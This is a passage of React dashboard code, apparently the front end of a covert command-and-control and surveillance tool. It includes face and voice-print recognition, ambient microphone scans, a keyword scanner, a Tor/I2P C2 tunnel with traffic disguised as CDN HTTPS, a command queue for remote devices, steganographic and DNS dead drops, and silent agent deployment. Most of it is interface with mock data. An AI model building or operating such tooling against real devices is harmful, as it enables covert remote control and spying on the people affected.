                    <Chip color={e.match.startsWith("Unknown")?"#ef4444":"#10b981"}>{e.action}</Chip>
                  </div>
                ))}
              </div>
            </div>

            <div className="rounded-2xl overflow-hidden border" style={{background:"#0a1628", borderColor:"rgba(16,185,129,0.25)"}}>
              <div className="px-5 py-3 border-b flex items-center justify-between" style={{borderColor:"rgba(16,185,129,0.15)", background:"#0d1930"}}>
                <div className="font-bold text-sm" style={{color:"#e2eaf6"}}>Voice Print Detection</div>
                <ActionBtn onClick={() => show("Voice model retrained")} color="#10b981" outline><RefreshCw size={11}/>Retrain</ActionBtn>
              </div>
              <div className="p-4 space-y-3">
                {([] as {name:string;conf:string;last:string;dev:string;status:string}[]).map((v,i) => (
                  <div key={i} className="flex items-center gap-3 px-3 py-2 rounded-xl border" style={{background:"#0d1930",borderColor:v.status==="alert"?"rgba(239,68,68,0.3)":"rgba(16,185,129,0.15)"}}>
                    <div className="w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm" style={{background:`rgba(${v.status==="alert"?"239,68,68":"16,185,129"},0.15)`,color:v.status==="alert"?"#ef4444":"#10b981"}}>
                      {v.status==="alert"?"?":v.name.charAt(0)}
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="text-xs font-semibold" style={{color:v.status==="alert"?"#ef4444":"#e2eaf6"}}>{v.name}</div>
                      <div className="text-[9px] font-mono" style={{color:"#6b8ab0"}}>{v.dev} · {v.last} · conf {v.conf}</div>
                    </div>
                    <Chip color={v.status==="alert"?"#ef4444":"#10b981"}>{v.status}</Chip>
                  </div>
                ))}
                <ActionBtn onClick={() => show("Ambient mic scan started")} color="#10b981" full><Mic size={12}/>Scan All Mics</ActionBtn>
              </div>
            </div>
          </div>
        </div>
      )}
      {tab === "ai" && (
        <div className="space-y-5">
          <div className="flex items-center justify-between flex-wrap gap-3">
            <div>
              <h2 className="font-black text-lg" style={{ color:"#e2eaf6" }}>AI Intelligence Engine</h2>
              <p className="text-xs mt-0.5" style={{ color:"#6b8ab0" }}>Anomaly detection · Behavioral analysis · Face/voice recognition · NLP</p>
            </div>
            <div className="flex gap-2">
              <ActionBtn onClick={() => show("AI model retrained on latest data")} color="#3b82f6"><Activity size={13}/>Retrain Model</ActionBtn>
            </div>
          </div>

          {/* AI stats */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            {[
              { label:"Anomalies Detected", value:"4",    color:"#ef4444", sub:"Last 1h" },
              { label:"Model Accuracy",     value:"96.4%",color:"#10b981", sub:"F1 score" },
              { label:"Events Analyzed",    value:"48.2K",color:"#3b82f6", sub:"Today"    },
              { label:"Threats Blocked",    value:"12",   color:"#f59e0b", sub:"This week" },
            ].map(s => <StatCard key={s.label} label={s.label} value={s.value} icon={<Activity size={15}/>} color={s.color} sub={s.sub}/>)}
          </div>

          {/* Anomalies */}
          <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
            <div className="px-5 py-3 border-b flex items-center justify-between" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#0d1930" }}>
              <div className="font-bold text-sm" style={{ color:"#e2eaf6" }}>Live Anomaly Feed</div>
              <ActionBtn onClick={() => show("Anomaly report exported","info")} color="#3b82f6" outline><Download size={11}/>Export</ActionBtn>
            </div>
            <div className="divide-y" style={{ borderColor:"rgba(59,130,246,0.08)" }}>
              {anomalies.map(a => {
                const rc = a.risk==="critical"?"#ef4444":a.risk==="high"?"#f59e0b":"#3b82f6";
                return (
                  <div key={a.id} className="flex items-start gap-4 px-5 py-4 hover:bg-purple-500/5 transition-colors">
                    <div className="flex-shrink-0 mt-0.5"><GlowDot color={rc}/></div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2 mb-1 flex-wrap">
                        <Chip color={rc}>{a.risk}</Chip>
                        <span className="font-bold text-sm" style={{ color:"#e2eaf6" }}>{a.type}</span>
                        <span className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{a.dev}</span>
                        <span className="text-[10px] font-mono" style={{ color:"#10d9a0" }}>conf {a.conf}</span>
                      </div>
                      <div className="text-sm" style={{ color:"#b8cce8" }}>{a.desc}</div>
                      <div className="text-[10px] font-mono mt-1" style={{ color:"#6b8ab0" }}>{a.det}</div>
                    </div>
                    <div className="flex gap-1 flex-shrink-0">
                      <ActionBtn onClick={() => show(`Investigation opened for ${a.dev}`,"info")} color="#3b82f6" outline><Search size={11}/>Investigate</ActionBtn>
                      <ActionBtn onClick={() => show(`${a.dev} locked and isolated`,"info")} color="#ef4444" outline><Lock size={11}/>Isolate</ActionBtn>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>

          {/* Playbooks + Face Recognition side by side */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
            {/* Auto-response playbooks */}
            <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
              <div className="px-5 py-3 border-b" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#0d1930" }}>
                <div className="font-bold text-sm" style={{ color:"#e2eaf6" }}>Auto-Response Playbooks</div>
              </div>
              <div className="divide-y p-2" style={{ borderColor:"rgba(59,130,246,0.08)" }}>
                {playbooks.map(p => (
                  <div key={p.id} className="flex items-start gap-3 px-3 py-3">
                    <div className="flex-1 min-w-0">
                      <div className="font-semibold text-sm" style={{ color:"#e2eaf6" }}>{p.name}</div>
                      <div className="text-[10px] font-mono mt-0.5" style={{ color:"#6b8ab0" }}>Trigger: <span style={{ color:"#10d9a0" }}>{p.trigger}</span></div>
                      <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>Action: <span style={{ color:"#10b981" }}>{p.action}</span></div>
                    </div>
                    <div className="w-8 h-4 rounded-full relative cursor-pointer flex-shrink-0 mt-1"
                      onClick={() => {
                        setPlaybooks(prev => prev.map(x => x.id===p.id ? {...x, active:!x.active} : x));
                        show(`Playbook "${p.name}" ${p.active?"disabled":"enabled"}`);
                      }}
                      style={{ background: p.active?"#3b82f6":"#0f1e3a" }}>
                      <div className="absolute top-0.5 w-3 h-3 rounded-full transition-all" style={{ left:p.active?"17px":"2px", background:"#fff" }}/>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Face recognition log */}
            <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(6,182,212,0.25)" }}>
              <div className="px-5 py-3 border-b flex items-center justify-between" style={{ borderColor:"rgba(6,182,212,0.15)", background:"#0d1930" }}>
                <div className="font-bold text-sm" style={{ color:"#e2eaf6" }}>Face Recognition Log</div>
                <Chip color="#10d9a0">LIVE</Chip>
              </div>
              <div className="divide-y" style={{ borderColor:"rgba(59,130,246,0.08)" }}>
                {faceEvents.map((e,i) => (
                  <div key={i} className="flex items-center gap-3 px-5 py-3">
                    <div className="w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0" style={{ background:"rgba(6,182,212,0.12)", border:"1px solid rgba(6,182,212,0.25)" }}>
                      <User size={18} color="#10d9a0"/>
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="text-xs font-semibold" style={{ color: e.match.startsWith("Unknown")?"#ef4444":"#e2eaf6" }}>{e.match}</div>
                      <div className="text-[10px] font-mono mt-0.5" style={{ color:"#6b8ab0" }}>{e.dev} · {e.ts} {e.conf && `· conf ${e.conf}`}</div>
                    </div>
                    <Chip color={e.match.startsWith("Unknown")?"#ef4444":"#10b981"}>{e.action}</Chip>
                  </div>
                ))}
                <div className="px-5 py-3">
                  <ActionBtn onClick={() => show("Face recognition scan started on all cameras")} color="#10d9a0" full><Camera size={12}/>Run Face Scan</ActionBtn>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}


      {/* NLP + Voice Print (appended to AI tab) */}
      {tab === "ai" && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-5" style={{marginTop:0}}>
          {/* NLP Keyword Scanner */}
          <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
            <div className="px-5 py-3 border-b flex items-center justify-between" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#0d1930" }}>
              <div className="font-bold text-sm" style={{ color:"#e2eaf6" }}>NLP Keyword Scanner</div>
              <Chip color="#3b82f6">LIVE</Chip>
            </div>
            <div className="p-4 space-y-3">
              <div className="text-[10px] font-mono uppercase tracking-widest mb-2" style={{ color:"#6b8ab0" }}>Monitored Keywords</div>
              <div className="flex flex-wrap gap-2 mb-3">
                {["password","secret","classified","bitcoin","exfil","delete","wipe","ransom","CEO","board meeting","acquisition"].map(kw => (
                  <span key={kw} className="px-2 py-0.5 rounded text-[10px] font-mono" style={{ background:"rgba(59,130,246,0.15)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.3)" }}>{kw}</span>
                ))}
                <button className="px-2 py-0.5 rounded text-[10px] font-mono" style={{ background:"rgba(16,185,129,0.12)", color:"#10b981", border:"1px solid rgba(16,185,129,0.25)" }}>+ Add</button>
              </div>
              <div className="text-[10px] font-mono uppercase tracking-widest mb-2" style={{ color:"#6b8ab0" }}>Recent Matches</div>
              {([] as {ts:string;dev:string;kw:string;ctx:string;risk:string}[]).map((m,i) => (
                <div key={i} className="px-3 py-2 rounded-xl border" style={{ background:"#0d1930", borderColor:`${m.risk==="critical"?"rgba(239,68,68,0.3)":m.risk==="high"?"rgba(245,158,11,0.3)":"rgba(59,130,246,0.2)"}` }}>
                  <div className="flex items-center gap-2 mb-1">
                    <span className="text-[9px] font-mono" style={{ color:"#6b8ab0" }}>{m.ts}</span>
                    <Chip color={m.risk==="critical"?"#ef4444":m.risk==="high"?"#f59e0b":"#3b82f6"}>{m.risk}</Chip>
                    <span className="text-[10px] font-mono" style={{ color:"#10d9a0" }}>{m.dev}</span>
                    <span className="text-[10px] font-bold px-1.5 py-0.5 rounded" style={{ background:"rgba(59,130,246,0.2)", color:"#3b82f6" }}>{m.kw}</span>
                  </div>
                  <div className="text-[10px] font-mono italic" style={{ color:"#6b8ab0" }}>{m.ctx}</div>
                </div>
              ))}
            </div>
          </div>

          {/* Voice Print Detection */}
          <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(16,185,129,0.25)" }}>
            <div className="px-5 py-3 border-b flex items-center justify-between" style={{ borderColor:"rgba(16,185,129,0.15)", background:"#0d1930" }}>
              <div className="font-bold text-sm" style={{ color:"#e2eaf6" }}>Voice Print Detection</div>
              <ActionBtn onClick={() => show("Voice print model retrained")} color="#10b981" outline><RefreshCw size={11}/>Retrain</ActionBtn>
            </div>
            <div className="p-4 space-y-3">
              <div className="text-[10px] font-mono uppercase tracking-widest mb-2" style={{ color:"#6b8ab0" }}>Enrolled Voice Prints</div>
              {([] as {name:string;conf:string;last:string;dev:string;status:string}[]).map((v,i) => (
                <div key={i} className="flex items-center gap-3 px-3 py-2.5 rounded-xl border" style={{ background:"#0d1930", borderColor: v.status==="alert"?"rgba(239,68,68,0.3)":"rgba(16,185,129,0.15)" }}>
                  <div className="w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 text-sm font-black" style={{ background:`rgba(${v.status==="alert"?"239,68,68":"16,185,129"},0.15)`, color: v.status==="alert"?"#ef4444":"#10b981" }}>
                    {v.status==="alert"?"?":v.name.charAt(0)}
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="text-xs font-semibold" style={{ color: v.status==="alert"?"#ef4444":"#e2eaf6" }}>{v.name}</div>
                    <div className="text-[9px] font-mono" style={{ color:"#6b8ab0" }}>{v.dev} · {v.last}</div>
                  </div>
                  <div className="text-right flex-shrink-0">
                    <Chip color={v.status==="alert"?"#ef4444":"#10b981"}>{v.status}</Chip>
                    <div className="text-[9px] font-mono mt-0.5" style={{ color:"#6b8ab0" }}>conf {v.conf}</div>
                  </div>
                </div>
              ))}
              <ActionBtn onClick={() => show("Voice scan started on all active microphones")} color="#10b981" full><Mic size={12}/>Scan All Active Mics</ActionBtn>
            </div>
          </div>
        </div>
      )}

      {/* ══ C2 OPS ══ */}
      {tab === "c2" && (
        <div className="space-y-5">
          <div className="flex items-center justify-between flex-wrap gap-3">
            <div>
              <h2 className="font-black text-lg" style={{ color:"#e2eaf6" }}>C2 Operations Center</h2>
              <p className="text-xs mt-0.5" style={{ color:"#6b8ab0" }}>Covert command & control · Encrypted tunnels · Relay chains · Dead drops</p>
            </div>
          </div>

          {/* C2 status bar */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
            {[
              { label:"C2 Tunnel",    value:c2Status.tunnel,    color:"#10b981", icon:<Shield size={15}/> },
              { label:"Relay Hops",   value:`${c2Status.hops} nodes`, color:"#3b82f6", icon:<Signal size={15}/> },
              { label:"C2 Latency",   value:c2Status.latency,  color:"#10d9a0", icon:<Activity size={15}/> },
              { label:"Encryption",   value:"AES-256-GCM",      color:"#f59e0b", icon:<Lock size={15}/> },
            ].map(s => <StatCard key={s.label} label={s.label} value={s.value} icon={s.icon} color={s.color}/>)}
          </div>

          {/* Tunnel + traffic controls */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="p-5 rounded-2xl border" style={{ background:"#0a1628", borderColor:"rgba(16,185,129,0.3)" }}>
              <div className="flex items-center justify-between mb-4">
                <div className="font-bold text-sm" style={{ color:"#e2eaf6" }}>Covert C2 Tunnel</div>
                <div className="flex items-center gap-1.5 text-xs font-mono" style={{ color:"#10b981" }}>
                  <div className="w-2 h-2 rounded-full animate-pulse" style={{ background:"#10b981" }}/>ACTIVE
                </div>
              </div>
              <div className="space-y-3 text-xs font-mono">
                {[
                  ["Protocol",   "Tor + TLS 1.3"],
                  ["Entry node", "185.220.101.x (DE)"],
                  ["Exit node",  "104.244.72.x (US)"],
                  ["Circuit ID", "3F:A1:B9:42:77:CE"],
                  ["Traffic",    "Disguised as CDN HTTPS"],
                ].map(([k,v]) => (
                  <div key={k} className="flex justify-between">
                    <span style={{ color:"#6b8ab0" }}>{k}</span>
                    <span style={{ color:"#b8cce8" }}>{v}</span>
                  </div>
                ))}
              </div>
              <div className="flex gap-2 mt-4">
                <ActionBtn onClick={() => show("New Tor circuit established")} color="#10b981" outline full><RefreshCw size={12}/>Rotate Circuit</ActionBtn>
                <ActionBtn onClick={() => show("Switching to I2P tunnel…")} color="#3b82f6" outline full><Signal size={12}/>Switch to I2P</ActionBtn>
              </div>
            </div>

            <div className="p-5 rounded-2xl border" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.3)" }}>
              <div className="font-bold text-sm mb-4" style={{ color:"#e2eaf6" }}>Traffic Obfuscation</div>
              <div className="space-y-3">
                {obfuscation.map(({ label, active, color }) => (
                  <div key={label} className="flex items-center justify-between">
                    <span className="text-sm" style={{ color: active?"#b8cce8":"#6b8ab0" }}>{label}</span>
                    <div className="flex items-center gap-2">
                      <Chip color={active?color:"#6b8ab0"}>{active?"ON":"OFF"}</Chip>
                      <button
                        onClick={() => {
                          setObfuscation(prev => prev.map(o => o.label===label ? {...o, active:!o.active} : o));
                          show(`${label} ${active?"disabled":"enabled"}`);
                        }}
                        className="w-8 h-4 rounded-full relative" style={{ background:active?color:"#0f1e3a" }}>
                        <div className="absolute top-0.5 w-3 h-3 rounded-full transition-all" style={{ left:active?"17px":"2px", background:"#fff" }}/>
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Command queue */}
          <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
            <div className="px-5 py-3 border-b flex items-center justify-between" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#0d1930" }}>
              <div className="font-bold text-sm" style={{ color:"#e2eaf6" }}>Command Queue</div>
              <ActionBtn onClick={() => show("Command queue flushed","info")} color="#ef4444" outline><X size={11}/>Flush Queue</ActionBtn>
            </div>
            <div className="px-5 py-4">
              <div className="flex gap-2 mb-4">
                <select value={newCmdDev} onChange={e => setNewCmdDev(e.target.value)} className="px-3 py-2 rounded-xl text-xs font-mono outline-none flex-shrink-0"
                  style={{ background:"#0d1930", border:"1px solid rgba(59,130,246,0.3)", color:"#e2eaf6" }}>
                  {SEED_DEVICES.filter(d=>d.status!=="offline").map(d => <option key={d.id} value={d.name}>{d.name}</option>)}
                </select>
                <input value={newCmd} onChange={e => setNewCmd(e.target.value)}
                  onKeyDown={e => { if (e.key==="Enter" && newCmd) { setCmdQueue(q=>[...q,{id:`c${Date.now()}`,dev:newCmdDev,cmd:newCmd,status:"pending",ts:new Date().toLocaleTimeString()}]); setNewCmd(""); show("Command queued"); }}}
                  placeholder="Enter command… (press Enter)"
                  className="flex-1 px-3 py-2 rounded-xl text-xs font-mono outline-none"
                  style={{ background:"#0d1930", border:"1px solid rgba(59,130,246,0.3)", color:"#10b981" }}/>
                <ActionBtn onClick={() => { if (newCmd) { setCmdQueue(q=>[...q,{id:`c${Date.now()}`,dev:newCmdDev,cmd:newCmd,status:"pending",ts:new Date().toLocaleTimeString()}]); setNewCmd(""); show("Command queued"); }}} color="#3b82f6"><Play size={12}/>Queue</ActionBtn>
              </div>
              <div className="space-y-2">
                {cmdQueue.map(c => {
                  const sc = c.status==="complete"?"#10b981":c.status==="running"?"#f59e0b":"#6b8ab0";
                  return (
                    <div key={c.id} className="flex items-center gap-3 px-4 py-2.5 rounded-xl" style={{ background:"#0d1930" }}>
                      <span className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{c.ts}</span>
                      <Chip color={OS_COLOR[SEED_DEVICES.find(d=>d.name===c.dev)?.os??"windows"]}>{c.dev}</Chip>
                      <code className="flex-1 text-xs font-mono" style={{ color:"#10b981" }}>{c.cmd}</code>
                      <Chip color={sc}>{c.status}</Chip>
                      <button onClick={() => setCmdQueue(q=>q.filter(x=>x.id!==c.id))} className="p-0.5 rounded" style={{ color:"#6b8ab0" }}><X size={10}/></button>
                    </div>
                  );
                })}
                {cmdQueue.length === 0 && <div className="text-center py-4 text-xs font-mono" style={{ color:"#1a3060" }}>Queue empty</div>}
              </div>
            </div>
          </div>

          {/* Dead drop + canary tokens */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="p-5 rounded-2xl border" style={{ background:"#0a1628", borderColor:"rgba(245,158,11,0.3)" }}>
              <div className="font-bold text-sm mb-3" style={{ color:"#e2eaf6" }}>Dead Drop Channels</div>
              {[
                { label:"Steganography (JPEG)", status:"active",  last:"14:30:00" },
                { label:"DNS TXT Records",      status:"active",  last:"14:28:00" },
                { label:"Pastebin Polling",     status:"standby", last:"13:00:00" },
              ].map(d => (
                <div key={d.label} className="flex items-center justify-between py-2 border-b" style={{ borderColor:"rgba(59,130,246,0.1)" }}>
                  <div>
                    <div className="text-xs font-semibold" style={{ color:"#e2eaf6" }}>{d.label}</div>
                    <div className="text-[9px] font-mono" style={{ color:"#6b8ab0" }}>Last: {d.last}</div>
                  </div>
                  <Chip color={d.status==="active"?"#10b981":"#6b8ab0"}>{d.status}</Chip>
                </div>
              ))}
              <div className="mt-3">
                <ActionBtn onClick={() => show("Dead drop message sent via steganography")} color="#f59e0b" outline full><Upload size={12}/>Send Dead Drop</ActionBtn>
              </div>
            </div>

            <div className="p-5 rounded-2xl border" style={{ background:"#0a1628", borderColor:"rgba(239,68,68,0.25)" }}>
              <div className="flex items-center justify-between mb-3">
                <div className="font-bold text-sm" style={{ color:"#e2eaf6" }}>Canary Tokens</div>
                <ActionBtn onClick={() => show("New canary token deployed")} color="#ef4444" outline><Signal size={11}/>Deploy</ActionBtn>
              </div>
              {[
                { file:"/docs/classified_ops.pdf", hits:0,  last:"Never",    status:"clean" },
                { file:"/backup/credentials.zip",  hits:2,  last:"14:22:00", status:"triggered" },
                { file:"/admin/config.env",         hits:0,  last:"Never",    status:"clean" },
              ].map(t => (
                <div key={t.file} className="flex items-center justify-between py-2 border-b" style={{ borderColor:"rgba(59,130,246,0.1)" }}>
                  <div className="min-w-0">
                    <div className="text-xs font-mono truncate" style={{ color:t.status==="triggered"?"#ef4444":"#b8cce8" }}>{t.file}</div>
                    <div className="text-[9px] font-mono" style={{ color:"#6b8ab0" }}>Hits: {t.hits} · Last: {t.last}</div>
                  </div>
                  <Chip color={t.status==="triggered"?"#ef4444":"#10b981"}>{t.status}</Chip>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* ══ DEPLOY ══ */}
      {tab === "deploy" && (() => {
        const DEPLOY_COLOR: Record<DeployStatus, string> = {
          "pending-approval":"#f59e0b", "approved":"#10d9a0", "running":"#3b82f6",
          "paused":"#f59e0b", "success":"#10b981", "failed":"#ef4444",
          "rolled-back":"#a855f7", "contained":"#ef4444",
        };
        const RISK_COLOR: Record<string, string> = { low:"#10b981", medium:"#f59e0b", high:"#ef4444", critical:"#dc2626" };
        const INIT_LABEL: Record<string, string> = { "ai-auto":"AI Auto", "admin":"Admin", "watchdog":"Watchdog" };

        const pendingJobs  = deployJobs.filter(j => j.status === "pending-approval");
        const runningJobs  = deployJobs.filter(j => j.status === "running" || j.status === "paused");
        const historyJobs  = deployJobs.filter(j => ["success","failed","rolled-back"].includes(j.status));

        const C2_BASE = (typeof window !== "undefined" && window.location.hostname !== "localhost")
          ? `${window.location.origin}/v1`
          : "http://localhost:3000/v1";

        const sendDeployCmd = async (jobId: string, type: string, version: string, checksum: string, rollbackVersion?: string) => {
          try {
            await fetch(`${C2_BASE}/deploy/job`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ jobId, type, version, checksum, rollbackVersion }),
            });
          } catch {
            // backend not reachable in UI-only mode — local state still updates
          }
        };

        const sendMdmRollback = async (jobId: string) => {
          try {
            await fetch(`${C2_BASE}/devices/broadcast/cmd`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ type: "UPDATE", payload: { jobId, action: "rollback" } }),
            });
          } catch {}
        };

        const approveJob = (id: string) => {
          const job = deployJobs.find(j => j.id === id);
          if (!job) return;
          setDeployJobs(p => p.map(j => j.id===id
            ? {...j, status:"running", progress: Math.max(j.progress, 5), log:[...j.log, `Approved ${new Date().toLocaleTimeString()}`]}
            : j));
          sendDeployCmd(id, job.type, job.version, job.checksum, job.rollbackVersion);
          show(`"${job.target}" deploy approved — dispatched silently to agent`, "success");
        };
        const pauseJob = (id: string) => {
          const job = deployJobs.find(j => j.id === id);
          const nowPaused = job?.status !== "paused";
          setDeployJobs(p => p.map(j => j.id===id
            ? {...j, status:nowPaused?"paused":"running", log:[...j.log, nowPaused?"Paused by admin":"Resumed by admin"]}
            : j));
          show(nowPaused ? "Deployment paused" : "Deployment resumed");
        };
        const rollbackJob = (id: string) => {
          const job = deployJobs.find(j => j.id === id);
          setDeployJobs(p => p.map(j => j.id===id
            ? {...j, status:"rolled-back", progress:0, log:[...j.log, `Rollback initiated ${new Date().toLocaleTimeString()}`, `Reverting to ${j.rollbackVersion || "previous version"}`]}
            : j));
          sendMdmRollback(id);
          show(`Rollback initiated for "${job?.target}" — reverting to ${job?.rollbackVersion || "previous"}`, "info");
        };
        const rejectJob = (id: string) => {
          const job = deployJobs.find(j => j.id === id);
          setDeployJobs(p => p.filter(j => j.id!==id));
          show(`Deploy to "${job?.target}" rejected and cancelled`, "info");
        };

        const allDeployLogs = deployJobs.flatMap(j => j.log.map((l,i) => ({
          ts: j.ts, job: j.id, target: j.target, type: j.type, version: j.version,
          initiator: j.initiator, msg: l, key: `${j.id}-${i}`,
        })));

        return (
          <div className="space-y-5">
            {/* Header */}
            <div className="flex items-center justify-between flex-wrap gap-3">
              <div>
                <h2 className="font-black text-lg" style={{ color:"#e2eaf6" }}>Deployment Platform</h2>
                <p className="text-xs mt-0.5" style={{ color:"#6b8ab0" }}>
                  Atomic updates · Silent auto-deploy · Human authorization · Fast rollback · Full audit
                </p>
              </div>
              {containmentActive && (
                <div className="flex items-center gap-2 px-4 py-2 rounded-xl animate-pulse" style={{ background:"rgba(220,38,38,0.15)", border:"1px solid rgba(220,38,38,0.5)" }}>
                  <Ban size={14} color="#dc2626"/>
                  <span className="text-xs font-bold" style={{ color:"#dc2626" }}>CONTAINMENT ACTIVE</span>
                </div>
              )}
            </div>

            {/* Stats row */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
              {[
                { label:"Pending Approval", value: pendingJobs.length,  color:"#f59e0b", icon:<Timer size={15}/> },
                { label:"In Progress",      value: runningJobs.length,  color:"#3b82f6", icon:<Activity size={15}/> },
                { label:"Successful",       value: deployJobs.filter(j=>j.status==="success").length, color:"#10b981", icon:<Check size={15}/> },
                { label:"Failed / Rolled Back", value: deployJobs.filter(j=>j.status==="failed"||j.status==="rolled-back").length, color:"#ef4444", icon:<AlertTriangle size={15}/> },
              ].map(s => <StatCard key={s.label} label={s.label} value={String(s.value)} icon={s.icon} color={s.color}/>)}
            </div>

            {/* Sub-tabs */}
            <div className="flex gap-1 p-1 rounded-xl w-fit" style={{ background:"#0d1930", border:"1px solid rgba(59,130,246,0.18)" }}>
              {([
                {id:"queue",       label:"Queue",        badge: pendingJobs.length},
                {id:"recovery",    label:"Recovery",     badge: null},
                {id:"audit",       label:"Audit Trail",  badge: null},
                {id:"containment", label:"Containment",  badge: null},
              ] as const).map(st => (
                <button key={st.id} onClick={() => setDeployTab(st.id)}
                  className="relative px-4 py-1.5 rounded-lg text-xs font-semibold transition-all flex items-center gap-1.5"
                  style={{ background:deployTab===st.id?"rgba(59,130,246,0.25)":"transparent", color:deployTab===st.id?"#3b82f6":"#6b8ab0" }}>
                  {st.label}
                  {st.badge ? (
                    <span className="w-4 h-4 rounded-full text-[9px] font-black flex items-center justify-center" style={{ background:"#f59e0b", color:"#0a1628" }}>{st.badge}</span>
                  ) : null}
                </button>
              ))}
            </div>

            {/* ── QUEUE ── */}
            {deployTab === "queue" && (
              <div className="space-y-4">
                {/* Pending approval */}
                {pendingJobs.length > 0 && (
                  <div>
                    <div className="text-[10px] font-mono uppercase tracking-widest mb-2" style={{ color:"#f59e0b" }}>
                      Awaiting Approval ({pendingJobs.length})
                    </div>
                    <div className="space-y-3">
                      {pendingJobs.map(job => (
                        <div key={job.id} className="p-4 rounded-xl border" style={{ background:"#0a1628", borderColor:"rgba(245,158,11,0.35)" }}>
                          <div className="flex items-start justify-between gap-3 flex-wrap">
                            <div className="min-w-0">
                              <div className="flex items-center gap-2 flex-wrap">
                                <span className="font-bold text-sm" style={{ color:"#e2eaf6" }}>{job.target}</span>
                                <Chip color={RISK_COLOR[job.risk]}>{job.risk} risk</Chip>
                                <Chip color="#6b8ab0">{INIT_LABEL[job.initiator]}</Chip>
                                {job.initiator === "ai-auto" && <Chip color="#3b82f6">AI-GENERATED</Chip>}
                              </div>
                              <div className="text-xs font-mono mt-1" style={{ color:"#6b8ab0" }}>
                                {job.type} · v{job.version} · SHA: {job.checksum} · {job.ts}
                              </div>
                              <div className="mt-2 space-y-0.5">
                                {job.log.map((l,i) => (
                                  <div key={i} className="text-[11px] font-mono" style={{ color:"#5a536e" }}>› {l}</div>
                                ))}
                              </div>
                            </div>
                            <div className="flex gap-2 flex-shrink-0 flex-wrap">
                              <ActionBtn onClick={() => approveJob(job.id)} color="#10b981"><Check size={12}/>Approve</ActionBtn>
                              <ActionBtn onClick={() => rejectJob(job.id)}  color="#ef4444" outline><X size={12}/>Reject</ActionBtn>
                            </div>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {/* Running / Paused */}
                {runningJobs.length > 0 && (
                  <div>
                    <div className="text-[10px] font-mono uppercase tracking-widest mb-2" style={{ color:"#3b82f6" }}>
                      In Progress ({runningJobs.length})
                    </div>
                    <div className="space-y-3">
                      {runningJobs.map(job => (
                        <div key={job.id} className="p-4 rounded-xl border" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.3)" }}>
                          <div className="flex items-start justify-between gap-3 flex-wrap">
                            <div className="flex-1 min-w-0">
                              <div className="flex items-center gap-2 flex-wrap mb-1">
                                <span className="font-bold text-sm" style={{ color:"#e2eaf6" }}>{job.target}</span>
                                <Chip color={DEPLOY_COLOR[job.status]}>{job.status}</Chip>
                                <Chip color={RISK_COLOR[job.risk]}>{job.risk}</Chip>
                              </div>
                              <div className="text-xs font-mono mb-2" style={{ color:"#6b8ab0" }}>
                                {job.type} · v{job.version} · {job.ts}
                              </div>
                              <div className="h-1.5 rounded-full overflow-hidden mb-1" style={{ background:"rgba(59,130,246,0.15)" }}>
                                <div className="h-full rounded-full transition-all" style={{ width:`${job.progress}%`, background:job.status==="paused"?"#f59e0b":"linear-gradient(90deg,#3b82f6,#10d9a0)" }}/>
                              </div>
                              <div className="text-[10px] font-mono" style={{ color:"#5a536e" }}>{job.progress}% · {job.log[job.log.length-1]}</div>
                            </div>
                            <div className="flex gap-2 flex-shrink-0">
                              <ActionBtn onClick={() => pauseJob(job.id)} color="#f59e0b" outline>
                                {job.status === "paused" ? <><Play size={12}/>Resume</> : <><Pause size={12}/>Pause</>}
                              </ActionBtn>
                              <ActionBtn onClick={() => rollbackJob(job.id)} color="#ef4444" outline><RotateCcw size={12}/>Rollback</ActionBtn>
                            </div>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {/* History */}
                {historyJobs.length > 0 && (
                  <div>
                    <div className="text-[10px] font-mono uppercase tracking-widest mb-2" style={{ color:"#6b8ab0" }}>
                      Completed
                    </div>
                    <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
                      <table className="w-full text-xs min-w-[540px]">
                        <thead>
                          <tr style={{ borderBottom:"1px solid rgba(59,130,246,0.15)", background:"#0d1930" }}>
                            {["Target","Type","Version","Status","Risk","Initiator","Time"].map(h => (
